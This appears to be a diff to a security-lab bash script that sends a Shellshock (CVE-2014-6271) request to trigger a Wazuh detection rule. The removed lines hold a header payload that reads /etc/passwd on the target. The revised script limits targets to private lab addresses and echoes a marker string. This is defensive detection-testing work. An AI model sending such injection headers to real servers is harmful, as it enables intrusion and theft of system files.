@@ -1,6 +1,17 @@
 #!/bin/bash
-# UC-06: simulate Shellshock (CVE-2014-6271) HTTP request against the Apache victim.
-# Source: S2 p.38-39, S5 img17.  Expected: rule 31168 level 15 + MITRE T1068/T1190.
-TARGET="${1:-192.168.100.108}"
-curl -s -H "User-Agent: () { :; }; /bin/cat /etc/passwd" "http://$TARGET" > /dev/null
-echo "Sent Shellshock payload to $TARGET — check dashboard: rule.description:Shellshock attack detected"
+# Purpose: harmless Shellshock-pattern lab request; owner [ASTRA]; 2026-09-09.
+# Status: syntax checked, lab pending. Source: UC-06, Wazuh 4.14 PoC.
+set -euo pipefail
+export PATH=/usr/bin:/bin
+[[ ${1:-} == --lab && $# == 2 ]] || { echo 'Usage: shellshock_test.sh --lab PRIVATE_IPV4 (approved non-CGI target)' >&2; exit 2; }
+TARGET=$2
+python3 - "$TARGET" <<'PY'
+import ipaddress, sys
+ip = ipaddress.IPv4Address(sys.argv[1])
+if not any(ip in ipaddress.ip_network(n) for n in ('10.0.0.0/8','172.16.0.0/12','192.168.0.0/16')):
+    raise SystemExit('Only explicitly approved RFC1918 lab addresses are accepted')
+PY
+curl --noproxy '*' --fail --silent --show-error --connect-timeout 5 --max-time 10 \
+  -H 'User-Agent: () { :; }; /bin/echo SOC_SHELLSHOCK_TEST' \
+  "http://${TARGET}/" > /dev/null
+echo "Request completed; verify rule 31168 and the source log (not exploit success)."
